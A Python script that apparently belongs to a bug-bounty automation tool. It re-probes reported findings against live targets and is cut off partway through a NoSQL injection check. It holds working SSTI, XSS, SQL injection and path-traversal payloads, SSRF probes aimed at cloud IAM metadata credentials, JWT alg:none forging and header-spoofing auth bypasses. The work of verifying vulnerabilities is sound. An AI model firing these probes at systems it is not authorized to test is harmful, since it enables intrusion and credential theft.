#!/usr/bin/env python3
"""
verify-finding.py — re-probe a finding to confirm it is real before it enters the report queue.

For each vulnerability class, sends a targeted live HTTP probe and checks for class-specific
confirmation signals. Returns confirmed/dismissed/unverifiable so phase_verify() can set verdict.

Classes that CAN be auto-verified (will auto-dismiss on failure):
  ssti, xss, cors, redirect, sqli, lfi

Classes that need extra context but try a basic check:
  ssrf, jwt, authz, idor, param, misconfig

Classes that require manual testing (never auto-dismiss):
  race, rce, logic, ato, info

Usage:
    verify-finding.py --url "https://t/p?x=1" --cls ssti [--param x] [--token "Bearer …"]
                      [--detail "…evidence text…"] [--json]
Emits:
    {"verified": true|false|null, "evidence": "…", "method": "…"}
      true  → finding is real       → verdict = "confirmed"
      false → finding is not real   → verdict = "false_positive"
      null  → cannot auto-verify    → keep original verdict
"""
import importlib, os, sys, json, urllib.request, urllib.parse, urllib.error, re

def arg(n, d=None):
    return sys.argv[sys.argv.index(n) + 1] if n in sys.argv else d

URL    = arg("--url")
CLS    = (arg("--cls") or "").lower().strip()
PARAM  = arg("--param")
TOKEN  = arg("--token")
DETAIL = arg("--detail") or ""
TIMEOUT = int(arg("--timeout", "12") or 12)

def out(d):
    if "--json" in sys.argv:
        print(json.dumps(d))
    else:
        v = d.get("verified")
        sym = "✓" if v is True else ("✗" if v is False else "?")
        print(f"{sym} [{d.get('method','?')}] {d.get('evidence','')}")
    sys.exit(0)

if not URL:
    out({"verified": None, "evidence": "no url provided", "method": "none"})

# ── HTTP helpers ────────────────────────────────────────────────────────────

class _NoRedir(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

def fetch(url, extra_headers=None, follow_redirects=True):
    h = {"User-Agent": "Mozilla/5.0 (HUNTR-verify/1.0)"}
    if TOKEN:
        h["Authorization"] = TOKEN if TOKEN.lower().startswith("bearer") else "Bearer " + TOKEN
    if extra_headers:
        h.update(extra_headers)
    try:
        opener = urllib.request.build_opener() if follow_redirects else urllib.request.build_opener(_NoRedir)
        req = urllib.request.Request(url, headers=h)
        with opener.open(req, timeout=TIMEOUT) as r:
            body = r.read(300_000).decode("utf-8", "ignore")
            resp_h = {k.lower(): v for k, v in r.getheaders()}
            return body, r.status, resp_h
    except urllib.error.HTTPError as e:
        try:
            body = e.read(300_000).decode("utf-8", "ignore")
        except Exception:
            body = ""
        resp_h = {k.lower(): v for k, v in (e.headers or {}).items()}
        return body, e.code, resp_h
    except Exception:
        return "", 0, {}

def req(url, method="GET", body=None, extra_headers=None, follow_redirects=True):
    """Full request helper (GET/POST/PUT/PATCH + body) — fetch() is GET-only."""
    h = {"User-Agent": "Mozilla/5.0 (HUNTR-verify/1.0)"}
    if TOKEN:
        h["Authorization"] = TOKEN if TOKEN.lower().startswith("bearer") else "Bearer " + TOKEN
    if extra_headers:
        h.update(extra_headers)
    data = None
    if body is not None:
        data = body.encode("utf-8") if isinstance(body, str) else body
    try:
        opener = urllib.request.build_opener() if follow_redirects else urllib.request.build_opener(_NoRedir)
        rq = urllib.request.Request(url, data=data, headers=h, method=method)
        with opener.open(rq, timeout=TIMEOUT) as r:
            return r.read(300_000).decode("utf-8", "ignore"), r.status, {k.lower(): v for k, v in r.getheaders()}
    except urllib.error.HTTPError as e:
        try: b = e.read(300_000).decode("utf-8", "ignore")
        except Exception: b = ""
        return b, e.code, {k.lower(): v for k, v in (e.headers or {}).items()}
    except Exception:
        return "", 0, {}

def get_qs(url):
    parts = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    return qs, parts

def inject(parts, qs, i, val):
    nq = qs[:]
    nq[i] = (nq[i][0], val)
    return urllib.parse.urlunparse(parts._replace(query=urllib.parse.urlencode(nq)))

def params_to_test(qs):
    indices = list(range(len(qs)))
    if PARAM:
        hit = [i for i, (k, _) in enumerate(qs) if k == PARAM]
        if hit:
            return hit
    return indices


def meaningful_reflection(needle, body):
    """Is `needle` (an injected marker/host) reflected somewhere that could actually be abused, not
    just present as harmless text? A bare 'needle in body' substring check — the original shape of
    this bug — false-positives on completely benign cases: an error page that says 'could not reach
    host evil-huntr-verify.com', a diagnostic/debug dump, etc. Require it to appear either (a) as
    part of a URL (after a scheme or protocol-relative '//'), which is the shape that actually drives
    a browser/client somewhere, or (b) inside an href/src/action/formaction attribute value, which is
    the shape that gets clicked/loaded. Anything else is reported but not auto-confirmed."""
    if not needle or not body:
        return False
    pat = re.escape(needle)
    if re.search(r'(?:https?:)?//[^\s"\'<>]*' + pat, body, re.I):
        return True
    if re.search(r'(?:href|src|action|formaction)\s*=\s*["\']?[^"\'>]*' + pat, body, re.I):
        return True
    return False


try:
    qs, parts = get_qs(URL)

    # ── SSTI ──────────────────────────────────────────────────────────────────
    if CLS in ("ssti", "template_injection"):
        A, B = 1337, 7
        PROD = str(A * B)   # 9359
        PAYLOADS = [
            ("{{%d*%d}}" % (A, B), "Jinja2/Twig"),
            ("${%d*%d}"  % (A, B), "FreeMarker/JSP-EL"),
            ("#{%d*%d}"  % (A, B), "Ruby/Thymeleaf"),
            ("${{%d*%d}}" % (A, B), "Smarty"),
        ]
        baseline, _, _ = fetch(URL)
        if PROD in baseline:
            out({"verified": False,
                 "evidence": f"product {PROD} already in clean baseline — coincidental value, not SSTI",
                 "method": "ssti_baseline_diff"})
        for i in params_to_test(qs):
            k = qs[i][0]
            for payload, engine in PAYLOADS:
                body, _, _ = fetch(inject(parts, qs, i, payload))
                if PROD in body and payload not in body:
                    out({"verified": True,
                         "evidence": f"param '{k}': {payload} → {PROD} reflected (engine: {engine})",
                         "method": "ssti_arithmetic"})
        out({"verified": False,
             "evidence": "no arithmetic evaluation on any param — not real SSTI",
             "method": "ssti_arithmetic"})

    # ── XSS ───────────────────────────────────────────────────────────────────
    elif CLS in ("xss", "reflected_xss", "stored_xss", "dom_xss"):
        CANARY = "HUNTRVERIFY1337"
        for i in params_to_test(qs):
            k = qs[i][0]
            # Custom tag — if reflected unescaped, confirmed
            tag = f"<{CANARY}>"
            body, _, _ = fetch(inject(parts, qs, i, tag))
            if tag in body:
                out({"verified": True,
                     "evidence": f"param '{k}' reflects unescaped HTML: {tag}",
                     "method": "xss_unescaped_tag"})
            # Quote-breaking + event handler
            evp = f'"><img src=x id={CANARY} onerror=1>'
            body2, _, _ = fetch(inject(parts, qs, i, evp))
            if f"id={CANARY}" in body2 and "onerror" in body2:
                out({"verified": True,
                     "evidence": f"param '{k}' reflects unescaped attribute injection",
                     "method": "xss_attr_inject"})
        out({"verified": False,
             "evidence": "no unescaped reflection — XSS not confirmed",
             "method": "xss_canary"})

    # ── CORS ──────────────────────────────────────────────────────────────────
    elif CLS in ("cors",):
        EVIL = "https://evil-huntr-verify.com"
        _, _, hdrs = fetch(URL, extra_headers={"Origin": EVIL})
        acao = hdrs.get("access-control-allow-origin", "")
        acac = hdrs.get("access-control-allow-credentials", "").lower()
        if acao == EVIL and acac == "true":
            out({"verified": True,
                 "evidence": f"ACAO reflects evil origin + ACAC: true → full CORS takeover",
                 "method": "cors_reflect_credentialed"})
        elif acao == EVIL:
            out({"verified": True,
                 "evidence": f"ACAO reflects evil origin (no credentials — lower impact)",
                 "method": "cors_reflect_no_creds"})
        elif acao == "*":
            out({"verified": True,
                 "evidence": "ACAO: * wildcard",
                 "method": "cors_wildcard"})
        else:
            out({"verified": False,
                 "evidence": f"ACAO='{acao}' ACAC='{acac}' — no origin reflection",
                 "method": "cors_reflect_credentialed"})

    # ── Open Redirect ─────────────────────────────────────────────────────────
    elif CLS in ("redirect", "open_redirect"):
        RDEST = "https://evil-huntr-verify.com"
        for i in params_to_test(qs):
            k = qs[i][0]
            body, status, hdrs = fetch(inject(parts, qs, i, RDEST), follow_redirects=False)
            loc = hdrs.get("location", "")
            # PROOF: a real server-side 3xx whose Location points off-domain
            if status in (301, 302, 303, 307, 308) and "evil-huntr-verify.com" in loc:
                out({"verified": True,
                     "evidence": f"param '{k}' → {status} Location: {loc}",
                     "method": "redirect_location"})
            # PROOF: a genuine CLIENT-SIDE redirect to the off-domain target (meta refresh or JS
            # location assignment) — NOT mere reflection of the value in the page body/canonical.
            m = re.search(r'<meta[^>]+http-equiv=["\']?refresh["\']?[^>]+url=\s*https?://evil-huntr-verify\.com', body, re.I)
            j = re.search(r'(?:location\.(?:href|replace|assign)\s*[=(]\s*|window\.location\s*=\s*)["\']?https?://evil-huntr-verify\.com', body, re.I)
            if m or j:
                out({"verified": True,
                     "evidence": f"param '{k}' → client-side redirect to evil domain ({'meta-refresh' if m else 'JS location'})",
                     "method": "redirect_clientside"})
        # Reflection of the value in the body / canonical / rewrite header is NOT an open redirect.
        out({"verified": False,
             "evidence": "param reflected but no off-domain 3xx or client-side redirect — not an open redirect",
             "method": "redirect_location"})

    # ── SQL Injection ─────────────────────────────────────────────────────────
    elif CLS in ("sqli", "sql_injection"):
        SQL_ERR = re.compile(
            r"you have an error in your sql syntax|"
            r"warning: mysql_|unclosed quotation mark|"
            r"quoted string not properly terminated|"
            r"\bora-\d{5}\b|microsoft sql native client|"
            r"sqlite3\.|pg_query\(\)|sqlstate|"
            r"syntax error.*near|unexpected token.*near|"
            r"invalid query|unterminated string",
            re.I)
        for i in params_to_test(qs):
            k = qs[i][0]
            orig_val = qs[i][1]
            # Error-based (body): single quote triggers a recognizable SQL error string
            body_err, st_q, _ = fetch(inject(parts, qs, i, orig_val + "'"))
            if SQL_ERR.search(body_err):
                out({"verified": True,
                     "evidence": f"SQL error triggered on param '{k}' via single-quote injection",
                     "method": "sqli_error_based"})
            # Error-based (status): baseline OK → lone quote 500s (SQL break) → a comment-terminated
            # injection recovers to non-500 (the `-- ` comments out the dangling quote). That recovery
            # is what proves the value is inside a SQL statement, even when the 500 page hides the error.
            _, st_base, _ = fetch(inject(parts, qs, i, orig_val))
            _, st_cmt, _ = fetch(inject(parts, qs, i, orig_val + "'-- -"))
            if st_base < 500 and st_q >= 500 and st_cmt < 500:
                out({"verified": True,
                     "evidence": f"error-based SQLi on '{k}': baseline {st_base}, lone-quote {st_q} (break), comment-terminated {st_cmt} (recovered → value is inside a SQL string)",
                     "method": "sqli_error_status"})
            # Boolean-based (string context): compare response sizes
            body_t, _, _ = fetch(inject(parts, qs, i, orig_val + "' AND '1'='1"))
            body_f, _, _ = fetch(inject(parts, qs, i, orig_val + "' AND '1'='2"))
            if body_t and body_f and abs(len(body_t) - len(body_f)) > 250:
                out({"verified": True,
                     "evidence": f"Boolean SQLi on '{k}': true={len(body_t)}B false={len(body_f)}B (diff {abs(len(body_t)-len(body_f))}B)",
                     "method": "sqli_boolean"})
            # Boolean-based (NUMERIC context — no quotes): orig AND 1=1 (true) vs orig AND 1=2 (false).
            # Confirmed when the true-condition matches baseline and the false-condition diverges.
            base_b, base_st, _ = fetch(inject(parts, qs, i, orig_val))
            nt_b, nt_st, _ = fetch(inject(parts, qs, i, orig_val + " AND 1=1"))
            nf_b, nf_st, _ = fetch(inject(parts, qs, i, orig_val + " AND 1=2"))
            # true-condition must track the baseline while the false-condition diverges — works for
            # tiny responses too (relative, not a fixed byte count), and requires the content to differ.
            _tol = max(8, int(len(base_b) * 0.1))
            if (nt_st < 500 and base_st < 500 and abs(len(nt_b) - len(base_b)) <= _tol
                    and nt_b != nf_b and abs(len(nt_b) - len(nf_b)) >= 3):
                out({"verified": True,
                     "evidence": f"numeric boolean SQLi on '{k}': AND 1=1 tracks baseline ({len(nt_b)}B≈{len(base_b)}B) but AND 1=2 diverges ({len(nf_b)}B) — value evaluated as SQL",
                     "method": "sqli_boolean_numeric"})
        out({"verified": False,
             "evidence": "no SQL error or boolean size difference — SQLi not confirmed",
             "method": "sqli_error_based"})

    # ── LFI / Path Traversal ──────────────────────────────────────────────────
    elif CLS in ("lfi", "path_traversal", "lfi_rfi", "file_inclusion"):
        LFI_SIGS = ["/root:", "www-data:", "nobody:", "daemon:", "root:x:0:0",
                    "/bin/bash", "/bin/sh", "sshd:", "nologin"]
        TRAVERSALS = [
            "../../../../etc/passwd",
            "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "/etc/passwd",
        ]
        for i in params_to_test(qs):
            k = qs[i][0]
            for t in TRAVERSALS:
                body, _, _ = fetch(inject(parts, qs, i, t))
                for sig in LFI_SIGS:
                    if sig in body:
                        out({"verified": True,
                             "evidence": f"LFI via '{k}' → /etc/passwd: '{sig}'",
                             "method": "lfi_passwd"})
        out({"verified": False,
             "evidence": "/etc/passwd content absent — LFI not confirmed",
             "method": "lfi_passwd"})

    # ── SSRF ──────────────────────────────────────────────────────────────────
    elif CLS in ("ssrf",):
        # Can only verify reflected SSRF (metadata in response) — blind SSRF needs OAST
        # content markers that only appear in a REAL cloud instance-metadata response (never in normal app output)
        METADATA_SIGS = ["ami-id", "instance-id", "iam/security-credentials", "AccessKeyId",
                         "computeMetadata", "metadata.google.internal", "ec2.internal",
                         "instance-metadata", "fd00:ec2::254", "securityGroups", "block-device-mapping",
                         "169.254.169.254/metadata/instance", "elastic-gpus"]
        # BUG FIX (2026-10-21, caught live on Databricks hunt): some METADATA_SIGS are substrings of
        # the META_URLS we inject (e.g. "fd00:ec2::254" is in "http://[fd00:ec2::254]/latest/meta-data/",
        # "169.254.169.254/metadata/instance" is in the Azure URL). If the server echoes the invalid
        # input in a 400 error message (very common for URL-valued params), the injected URL gets
        # reflected verbatim in the response — and those sigs appear in it, confirming a "full
        # SSRF→metadata credential chain" that never happened. The signature must appear in the
        # RESPONSE only, not in the URL that was injected. Gate injection-based confirmation on sigs
        # that are NOT already present in the specific murl being tested.
        # full cloud-metadata chain: AWS IMDSv1, GCP (needs a header — flagged if reached), Azure, Alibaba, ECS task role
        META_URLS = [
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",   # AWS IMDSv1
            "http://169.254.169.254/latest/meta-data/",
            "http://[fd00:ec2::254]/latest/meta-data/",                            # AWS IPv6
            "http://metadata.google.internal/computeMetadata/v1/",                 # GCP
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",     # Azure
            "http://100.100.100.200/latest/meta-data/",                            # Alibaba
            "http://169.254.170.2/v2/credentials/",                                # AWS ECS task role
        ]
        body, _, _ = fetch(URL)
        for sig in METADATA_SIGS:
            if sig in body:
                out({"verified": True, "evidence": f"SSRF: cloud instance-metadata marker '{sig}' present in response", "method": "ssrf_metadata_reflected"})
        for i in params_to_test(qs):
            k = qs[i][0]
            for murl in META_URLS:
                body2, _, _ = fetch(inject(parts, qs, i, murl))
                for sig in METADATA_SIGS:
                    if sig in murl:
                        continue  # sig is in the URL we injected — an echo/error reflection would look identical; skip
                    if sig in body2:
                        out({"verified": True, "evidence": f"SSRF via '{k}': fetched {murl.split('/')[2]} and the response leaked cloud-metadata marker '{sig}' — full SSRF→metadata credential chain", "method": "ssrf_inject_metadata"})
        # OAST PROOF of BLIND SSRF: stand up a callback listener, inject its URL, and check for a hit.
        # The callback host is HUNTR_OAST_HOST (a public/interactsh host for real targets) or a local
        # listener (works for any target that can reach this machine, incl. localhost labs).
        try:
            import http.server, socketserver, threading as _th, socket as _sock, uuid as _uuid, time as _t
            token = _uuid.uuid4().hex[:12]
            hits = []
            class _H(http.server.BaseHTTPRequestHandler):
                def do_GET(self):
                    hits.append(self.path)
                    self.send_response(200); self.end_headers(); self.wfile.write(b"ok")
                def log_message(self, *a):
                    pass
            srv = socketserver.TCPServer(("0.0.0.0", 0), _H); srv.timeout = 1
            port = srv.server_address[1]
            _th.Thread(target=srv.serve_forever, daemon=True).start()
            cb_host = os.environ.get("HUNTR_OAST_HOST")
            if not cb_host:
                try:
                    cb_host = _sock.gethostbyname(_sock.gethostname())
                except Exception:
                    cb_host = "127.0.0.1"
            cb = f"http://{cb_host}:{port}/{token}"
            cb_local = f"http://127.0.0.1:{port}/{token}"
            for i in params_to_test(qs):
                k = qs[i][0]
                fetch(inject(parts, qs, i, cb))
                fetch(inject(parts, qs, i, cb_local))
                _t.sleep(0.6)
                if any(token in h for h in hits):
                    srv.shutdown()
                    out({"verified": True,
                         "evidence": f"blind SSRF PROVEN via '{k}': server made an outbound request to our OAST callback (token {token} received)",
                         "method": "ssrf_oast_callback"})
            srv.shutdown()
        except Exception:
            pass
        out({"verified": None,
             "evidence": "blind SSRF — no OAST callback received (target may not reach the listener; set HUNTR_OAST_HOST to a public host)",
             "method": "ssrf_oast_required"})

    # ── JWT ───────────────────────────────────────────────────────────────────
    elif CLS in ("jwt",):
        import base64
        if TOKEN:
            tok = TOKEN.replace("Bearer ", "").strip()
            parts_jwt = tok.split(".")
            if len(parts_jwt) == 3:
                try:
                    hdr = json.loads(base64.b64decode(parts_jwt[0] + "==").decode("utf-8", "ignore"))
                    hdr["alg"] = "none"
                    new_hdr = base64.b64encode(json.dumps(hdr, separators=(",",":")).encode()).decode().rstrip("=")
                    forged = f"{new_hdr}.{parts_jwt[1]}."
                    body_forged, st_forged, _ = fetch(URL, extra_headers={"Authorization": f"Bearer {forged}"})
                    # Unauthenticated baseline
                    _, st_unauth, _ = fetch(URL, extra_headers={"Authorization": ""})
                    if st_forged == 200 and st_unauth in (401, 403):
                        out({"verified": True,
                             "evidence": f"JWT alg:none bypass accepted (200) vs unauthed ({st_unauth})",
                             "method": "jwt_alg_none"})
                except Exception:
                    pass
        out({"verified": None,
             "evidence": "JWT: alg:none not confirmed or no token available — manual review required",
             "method": "jwt_alg_none"})

    # ── IDOR / BOLA (object enumeration) ──────────────────────────────────────
    elif CLS in ("idor", "bola"):
        # PROOF of an unauthenticated/horizontal IDOR: change the object id and get DIFFERENT
        # private data back with no auth. Distinct ids → distinct non-error bodies = direct object
        # access with no ownership check. (A second session is only needed for authenticated BOLA;
        # this catches the far more common enumerable case.)
        idx = None
        for i in params_to_test(qs):
            if PARAM and qs[i][0] == PARAM:
                idx = i; break
            if idx is None and re.match(r"^(\d+|[0-9a-f-]{8,})$", qs[i][1] or ""):
                idx = i
        if idx is not None:
            k = qs[idx][0]; base_val = qs[idx][1]
            bodies = {}
            trials = []
            if base_val.isdigit():
                n = int(base_val); trials = [str(n), str(n + 1), str(n + 2)]
            else:
                trials = [base_val]
            for tv in trials:
                b, st, _ = fetch(inject(parts, qs, idx, tv), extra_headers={"Authorization": ""})
                if st == 200 and b.strip():
                    bodies[tv] = b
            uniq = set(bodies.values())
            if len(bodies) >= 2 and len(uniq) >= 2:
                sample = list(bodies.items())
                out({"verified": True,
                     "evidence": f"IDOR on '{k}': ids {list(bodies.keys())} each return DISTINCT private data unauthenticated "
                                 f"(e.g. {k}={sample[0][0]}→{len(sample[0][1])}B vs {k}={sample[1][0]}→{len(sample[1][1])}B) — no ownership check",
                     "method": "idor_enumeration"})
        out({"verified": None,
             "evidence": "could not enumerate a distinct object by id (may be an authenticated BOLA needing two sessions)",
             "method": "idor_enumeration"})

    # ── AuthZ / auth-bypass (privilege gate bypass) ───────────────────────────
    elif CLS in ("authz", "authorization", "broken_access_control", "auth_bypass", "auth-bypass"):
        # DOCTRINE: a 403/401 is a DOOR. Baseline the denial, then actively walk a bypass MATRIX
        # (client-controlled flags + access-control header spoofs) and prove any 403→200 privileged flip.
        base_qs = [(kk, vv) for (kk, vv) in qs if kk.lower() not in ("debug", "admin", "is_admin", "role", "test", "internal")]
        base_url = urllib.parse.urlunparse(parts._replace(query=urllib.parse.urlencode(base_qs)))
        base_body, base_st, _ = fetch(base_url, extra_headers={"Authorization": ""})
        denied = base_st in (401, 403) or "forbidden" in base_body.lower()[:200] or "unauthor" in base_body.lower()[:200]

        def _privileged(body, st, base):
            return st == 200 and len(body) > max(50, len(base) - 20) and (
                "admin" in body.lower() or "grant" in body.lower() or "sk_live" in body or
                "api_master" in body.lower() or "secret" in body.lower() or
                len(re.findall(r'"[a-z_]+":', body)) > 3)

        sep = "&" if base_qs else "?"
        param_variants = ["debug=1", "admin=true", "admin=1", "is_admin=true", "role=admin",
                          "test=1", "internal=1", "isAdmin=true", "access=admin"]
        header_variants = [{"X-Admin": "true"}, {"X-Forwarded-For": "127.0.0.1"}, {"X-Originating-IP": "127.0.0.1"},
                           {"X-Custom-IP-Authorization": "127.0.0.1"}, {"X-Forwarded-Host": "localhost"},
                           {"X-Original-URL": parts.path}, {"X-Rewrite-URL": parts.path},
                           {"X-Remote-User": "admin"}, {"X-Forwarded-For": "localhost", "X-Admin": "1"}]
        # param-based flags
        # BUG FIX (2026-10-15): this used to read `and (denied or vs == 200)` — since the test
        # request is almost always 200 for a normal page, `or vs == 200` made the `denied` check a
        # no-op, so ANY ordinary public page whose body merely LOOKED "privileged" (contains the
        # word "admin"/"secret", or has >3 JSON-ish `"key":` fields — common on any SPA) got
        # "confirmed" as a bypass even though baseline was NEVER actually denied. Real incident: a
        # crypto wallet's public marketing pages (/assets, /ledger-wallet, /trezor-wallet,
        # /bitcoin-wallet — baseline 200, same 200 with ?debug=1) were all "confirmed High" with the
        # self-contradicting evidence string "denied at baseline (200)". The doctrine above is "a
        # 403/401 is a DOOR" — enforce it: a bypass requires baseline to have ACTUALLY been denied.
        for pv in param_variants:
            vb, vs, _ = fetch(base_url + sep + pv, extra_headers={"Authorization": ""})
            if denied and _privileged(vb, vs, base_body):
                out({"verified": True, "evidence": f"auth bypass: '{parts.path}' denied at baseline ({base_st}) but '?{pv}' returns 200 with privileged content — client-controlled authz gate", "method": "authz_bypass_param"})
        # header-based access-control spoofs
        for hv in header_variants:
            hb, hs, _ = fetch(base_url, extra_headers={**hv, "Authorization": ""})
            if _privileged(hb, hs, base_body) and denied:
                out({"verified": True, "evidence": f"auth bypass: baseline {base_st} but header {list(hv.keys())} flips it to 200 with privileged content — access control trusts a client-supplied header", "method": "authz_bypass_header"})
        # fully-unauthenticated privileged exposure (no gate at all) — unlike the two checks above,
        # there is no denied-baseline to compare against here, so "JSON-shaped with >3 keys" alone
        # (the original condition) is FAR too weak a bar: it's satisfied by any ordinary PUBLIC JSON
        # API (a product listing, a search endpoint, pagination metadata — virtually any REST
        # response with a handful of fields), with nothing establishing the content is actually
        # sensitive. Same false-positive shape as the 2026-10-15 fix above, just missing the
        # equivalent guard. Require an actual sensitivity marker instead of mere JSON shape.
        #
        # BUG FIX (2026-10-21): caught live on a real hunt — a marketing SPA's /signup page (full
        # HTML, not an API response) matched on "admin" via a client-side feature-flag blob shipped
        # to every anonymous visitor: `"isAdmin": {"defaultValue": false, "type": "uiFlagKey", ...}`.
        # Any sufficiently large modern page (hydration data, analytics/tracking schemas, i18n keys,
        # form-field metadata) will probabilistically contain one of these substrings SOMEWHERE,
        # completely unrelated to a real authz bypass — a plain keyword-anywhere-in-the-body check
        # has no way to distinguish a leaked VALUE from a boilerplate field NAME/schema definition.
        # This check is inherently only meaningful against an actual API response (the "privileged
        # data" framing presumes JSON data, not an HTML document with embedded client config) — so
        # require the body to actually BE JSON (by header or by shape) before even considering it,
        # and require the matched field to carry a real string-shaped VALUE, not a schema/boolean.
        gb, gs, gh = fetch(URL, extra_headers={"Authorization": ""})
        _sensitive = gb.lower()
        _body_is_json = ("json" in (gh or {}).get("content-type", "").lower()
                          or gb.lstrip()[:1] in ("{", "["))
        _has_sensitive_signal = _body_is_json and (
            any(kw in _sensitive for kw in ("secret", "password", "ssn", "api_master")) or
            "sk_live" in gb or
            re.search(r'"(email|role|permission|is_admin|api_key|access_token|ssn|credit_card)"\s*:\s*"[^"]{3,}"', _sensitive)
        )
        if gs == 200 and len(gb) > 200 and _has_sensitive_signal:
            out({"verified": True, "evidence": f"AuthZ: endpoint returns privileged data unauthenticated (200, {len(gb)}B) — contains a sensitive field/keyword", "method": "authz_unauth_access"})
        out({"verified": None, "evidence": "no auth-gate bypass demonstrated across the param/header matrix — may need a real low-priv session (BFLA)", "method": "authz_bypass"})

    # ── GraphQL (introspection / field-suggestion / batching / depth) ─────────
    elif CLS in ("graphql", "gql"):
        jh = {"Content-Type": "application/json"}
        # 1) introspection enabled → full schema leak (hard signal)
        gb, _, _ = req(URL, method="POST", body='{"query":"{__schema{types{name}}}"}', extra_headers=jh)
        if '"__schema"' in gb and '"types"' in gb:
            out({"verified": True, "evidence": f"GraphQL introspection ENABLED: full schema leaks (__schema.types present) — entire API surface mapped", "method": "graphql_introspection"})
        # 2) field-suggestion leak: even with introspection OFF, a wrong field name makes the server
        #    suggest the real ones ("Did you mean ...") — schema disclosure.
        sb, _, _ = req(URL, method="POST", body='{"query":"{__huntr_nosuchfield_xyz}"}', extra_headers=jh)
        if re.search(r'did you mean', sb, re.I) and re.search(r'"(message|errors)"', sb):
            out({"verified": True, "evidence": "GraphQL field-suggestion leak: server returns 'Did you mean …' for an invalid field — schema is disclosed despite introspection controls", "method": "graphql_field_suggestion"})
        # 3) query batching / aliasing allowed: N aliased ops in ONE request all execute → auth/rate-limit
        #    brute-force amplifier. Proof = the response carries all N distinct aliases.
        aliases = "".join('a%d:__typename ' % i for i in range(5))
        bb, _, _ = req(URL, method="POST", body=json.dumps({"query": "{" + aliases + "}"}), extra_headers=jh)
        if all(('"a%d"' % i) in bb for i in range(5)):
            out({"verified": True, "evidence": "GraphQL batching/aliasing allowed: 5 aliased operations executed in one request (all returned) — enables auth brute-force & rate-limit bypass", "method": "graphql_batching"})
        # JSON-array batching variant
        arr = json.dumps([{"query": "{__typename}"} for _ in range(5)])
        ab, _, _ = req(URL, method="POST", body=arr, extra_headers=jh)
        if ab.strip().startswith("[") and ab.count('"__typename"') >= 3:
            out({"verified": True, "evidence": "GraphQL array-batching allowed: a JSON array of queries executed as a batch — rate-limit/2FA brute-force amplifier", "method": "graphql_array_batch"})
        out({"verified": None, "evidence": "GraphQL present but no introspection/suggestion/batching weakness confirmed — resolver-level authz needs two identities (agent)", "method": "graphql"})

    # ── Secret / source leak — confirm the secret is REAL (not public-by-design) ──
    elif CLS in ("secret", "source-leak", "source_leak", "info-leak", "credential"):
        body, _, _ = fetch(URL)
        blob = (body or "") + " " + DETAIL
        # real secret patterns (kept in sync with fp_rules): if present → proof; public keys → not a secret
        REAL = [r"\bsk_live_[0-9a-zA-Z]{10,}", r"\bAKIA[0-9A-Z]{16}\b", r"-----BEGIN (?:RSA |EC )?PRIVATE KEY-----",
                r"\bgh[pousr]_[0-9A-Za-z]{30,}", r"\bxox[baprs]-[0-9A-Za-z-]{10,}",
                r"client_secret['\"]?\s*[:=]\s*['\"]?[0-9a-zA-Z\-_]{16,}"]
        for pat in REAL:
            mm = re.search(pat, blob)
            if mm:
                out({"verified": True,
                     "evidence": f"real secret exposed: pattern {pat} matched (e.g. {mm.group(0)[:12]}…) — not a public-by-design key",
                     "method": "secret_real"})
        out({"verified": False,
             "evidence": "no real secret pattern found; any exposed values are public-by-design (NEXT_PUBLIC/reCAPTCHA/analytics) → info, not a leak",
             "method": "secret_real"})

    # ── Param / Injection (generic) ───────────────────────────────────────────
    elif CLS in ("param", "injection"):
        # Try to extract the confirmed payload from detail and re-probe
        # Look for patterns like "param 'x' reflected … → <value>"
        m = re.search(r"param[^']*'([^']+)'", DETAIL, re.I)
        probe_param = PARAM or (m.group(1) if m else None)
        if probe_param:
            for i, (k, _) in enumerate(qs):
                if k == probe_param:
                    # Re-run the original canary
                    CANARY = "HUNTRVERIFY1337"
                    body, _, _ = fetch(inject(parts, qs, i, CANARY))
                    if CANARY in body:
                        out({"verified": True,
                             "evidence": f"param '{k}' reflects input verbatim (injection surface confirmed)",
                             "method": "param_reflection"})
        out({"verified": None,
             "evidence": "param injection — manual verification required",
             "method": "param_manual"})

    # ── Misconfig ─────────────────────────────────────────────────────────────
    elif CLS in ("misconfig", "misconfiguration", "info"):
        # Check if the endpoint is reachable and returns the flagged content
        body, status, hdrs = fetch(URL)
        if status != 200 or len(body) <= 100:
            out({"verified": False,
                 "evidence": f"Endpoint returned {status} — not accessible",
                 "method": "misconfig_reachable"})
        # BUG FIX (2026-10-18): this used to fall through to an unconditional "verified: True" on
        # "status 200, body > 100 bytes" alone whenever DETAIL had no quoted strings, or none of up
        # to 3 matched — i.e. EVERY ordinary, correctly-working page on the internet satisfies that
        # bar. The content-specific check below (does the EXACT thing the original finding claimed
        # — e.g. a quoted path like ".git/config" — actually appear live) is the only real signal
        # here; its absence or failure must not silently become "confirmed."
        if DETAIL:
            quoted = re.findall(r'"([^"]{4,80})"', DETAIL)
            if quoted:
                for q in quoted[:3]:
                    if q in body:
                        out({"verified": True,
                             "evidence": f"Misconfig: '{q}' confirmed in live response",
                             "method": "misconfig_content_check"})
                out({"verified": False,
                     "evidence": "endpoint reachable, but the specific content the finding claimed "
                                 "is no longer present — likely fixed, or a false positive",
                     "method": "misconfig_content_check"})
        out({"verified": None,
             "evidence": f"endpoint reachable (200, {len(body)}B) but nothing specific to check against "
                         "— reachability alone doesn't prove a misconfiguration; needs manual review",
             "method": "misconfig_reachable"})

    # ── Race Condition / RCE / Logic / ATO ────────────────────────────────────
    # ── NoSQL injection — operator injection boolean diff ─────────────────────
    elif CLS in ("nosqli", "nosql", "nosql_injection"):
        import uuid as _uu
        for i in params_to_test(qs):
            k, ov = qs[i][0], qs[i][1]
            bogus_val = "huntr" + _uu.uuid4().hex[:8]        # a value that matches NOTHING
            # do NOT follow redirects: a nosqli data endpoint answers 200 with records; following a 3xx
            # would land on an unrelated page (e.g. the index) and fake a huge "result set".
            base, bst, _ = fetch(inject(parts, qs, i, ov), follow_redirects=False)
            bog, bgst, _ = fetch(inject(parts, qs, i, bogus_val), follow_redirects=False)
            neu = urllib.parse.urlunparse(parts._replace(query=parts.query.replace(k + "=" + ov, k + "[$ne]=" + ov) if (k + "=" + ov) in parts.query else parts.query + "&" + k + "[$ne]=x"))
            ne, nst, _ = fetch(neu, follow_redirects=False)
